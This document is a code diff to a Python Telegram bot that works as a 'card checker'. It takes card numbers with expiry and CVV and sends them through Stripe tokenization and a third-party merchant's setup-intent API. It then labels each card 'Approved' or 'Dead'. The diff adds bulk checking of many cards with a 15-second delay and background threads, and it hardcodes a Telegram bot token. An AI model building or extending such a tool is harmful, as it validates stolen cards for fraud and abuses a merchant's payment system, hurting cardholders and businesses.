@@ -1,7 +1,8 @@
 import telebot
 import requests
 import re
-import json
+import time
+import threading
 
 BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -20,16 +21,10 @@ def parse_card_input(text):
         yy = yy[2:]  # convert YYYY to YY
     return cc, mm, yy, cvv
 
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    bot.reply_to(message,
-        "Send me a card to check in format:\nCC|MM|YY|CVV\nor\nCC|MM|YYYY|CVV\nExample:\n4111111111111111|12|25|123")
-
-@bot.message_handler(func=lambda m: True)
-def check_card(message):
-    card_data = parse_card_input(message.text)
+def check_single_card(card_text, chat_id):
+    card_data = parse_card_input(card_text)
     if not card_data:
-        bot.reply_to(message, "❌ Invalid format. Please send card as CC|MM|YY|CVV or CC|MM|YYYY|CVV")
+        bot.send_message(chat_id, f"❌ Invalid format for card: `{card_text}`\nPlease use CC|MM|YY|CVV or CC|MM|YYYY|CVV", parse_mode='Markdown')
         return
 
     cc, mm, yy, cvv = card_data
@@ -53,21 +48,21 @@ def check_card(message):
     }
 
     try:
-        stripe_resp = requests.post(stripe_url, data=stripe_payload)
+        stripe_resp = requests.post(stripe_url, data=stripe_payload, timeout=30)
         stripe_resp.raise_for_status()
         stripe_json = stripe_resp.json()
     except Exception as e:
-        bot.reply_to(message, f"🔴 Error connecting to Stripe API:\n{str(e)}")
+        bot.send_message(chat_id, f"🔴 Error connecting to Stripe API for card `{card_text}`:\n{str(e)}")
         return
 
     if 'error' in stripe_json:
         error_msg = stripe_json['error'].get('message', 'Unknown Stripe error')
-        bot.reply_to(message, f"❌ Stripe error: {error_msg}")
+        bot.send_message(chat_id, f"❌ Stripe error for card `{card_text}`: {error_msg}")
         return
 
     pm_id = stripe_json.get('id')
     if not pm_id:
-        bot.reply_to(message, "❌ Failed get payment method ID from Stripe.")
+        bot.send_message(chat_id, f"❌ Failed to get payment method ID from Stripe for card `{card_text}`.")
         return
 
     # Step 2: Use pm_id in Bloomingriders API to create setup intent
@@ -90,22 +85,51 @@ def check_card(message):
     }
 
     try:
-        br_resp = requests.post(br_url, headers=br_headers, json=br_json)
+        br_resp = requests.post(br_url, headers=br_headers, json=br_json, timeout=30)
         br_resp.raise_for_status()
         br_json_resp = br_resp.json()
     except Exception as e:
-        bot.reply_to(message, f"🔴 Error connecting to Bloomingriders API:\n{str(e)}")
+        bot.send_message(chat_id, f"🔴 Error connecting to Bloomingriders API for card `{card_text}`:\n{str(e)}")
         return
 
     # Check if "error" key exists in final response JSON
     if "error" in br_json_resp:
-        result_msg = f"❌ Card Declined (Dead)\nError: {br_json_resp['error']}"
+        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}"
     else:
-        result_msg = "✅ Card Approved (Success)"
+        result_msg = f"✅ Card Approved (Success) for `{card_text}`"
 
-    # Send full JSON response formatted nicely for transparency
-    full_response = json.dumps(br_json_resp, indent=2, ensure_ascii=False)
+    bot.send_message(chat_id, result_msg)
 
-    bot.reply_to(message, f"{result_msg}\n\nFull response:\n{full_response}")
+def process_cards(cards, chat_id):
+    """
+    Process list of cards one by one, with 15 seconds delay between each.
+    """
+    for idx, card in enumerate(cards):
+        card = card.strip()
+        if not card:
+            continue
+        check_single_card(card, chat_id)
+        # Don't delay after last card
+        if idx != len(cards) - 1:
+            time.sleep(15)
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    bot.reply_to(message,
+        "Send me one or multiple cards to check.\n"
+        "Use format per card:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
+        "Separate multiple cards by new lines.\n\n"
+        "Example:\n4111111111111111|12|25|123\n5555555555554444|11|2026|456")
+
+@bot.message_handler(func=lambda m: True)
+def handle_cards(message):
+    # Split message by lines to get multiple cards
+    cards = message.text.strip().split('\n')
+    if len(cards) == 0:
+        bot.reply_to(message, "❌ No cards found in your message.")
+        return
+
+    # Run card processing in a separate thread so bot doesn't block
+    threading.Thread(target=process_cards, args=(cards, message.chat.id), daemon=True).start()
 
 bot.polling()
